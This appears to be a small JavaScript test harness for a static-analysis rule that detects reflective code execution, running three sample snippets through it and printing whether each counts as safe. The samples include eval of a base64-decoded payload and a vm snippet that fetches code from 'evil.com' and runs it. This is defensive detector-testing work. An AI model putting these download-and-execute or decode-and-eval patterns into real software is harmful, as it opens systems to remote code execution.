const rule26 = require("../services/rule26.reflective");

const samples = [
  {
    name: "Static Function usage",
    code: `new Function("return 1")();`
  },
  {
    name: "Dynamic eval with base64",
    code: `
      const payload = Buffer.from(data, "base64").toString();
      eval(payload);
    `
  },
  {
    name: "vm with remote input",
    code: `
      const vm = require("vm");
      const code = fetch("http://evil.com/x").then(r => r.text());
      vm.runInThisContext(code);
    `
  }
];

samples.forEach(s => {
  const findings = rule26.run({ sourceCode: s.code });
  const safe = findings.every(f => f.severity !== "HIGH");

  console.log(
    `${s.name} → safe: ${safe}`
  );

  if (findings.length) {
    console.log("  findings:", findings);
  }
});
